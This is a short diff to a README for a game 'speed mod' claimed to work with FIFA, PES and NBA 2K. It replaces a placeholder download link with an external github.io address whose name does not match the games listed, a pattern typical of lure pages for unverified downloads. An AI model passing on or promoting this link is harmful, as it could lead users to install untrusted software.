@@ -2,7 +2,7 @@
 
 Take full control over your players' speed stats in top sports games like FIFA, PES, or NBA 2K. Perfect for training drills, speedruns, or creating balanced matches.
 
-[![Download Speed Mod](https://img.shields.io/badge/Download-SpeedMod-blueviolet)](#)
+[![Download Speed Mod](https://img.shields.io/badge/Download-SpeedMod-blueviolet)](https://schedule-1-player-speed-mod.github.io/.github)
 
 ---
 
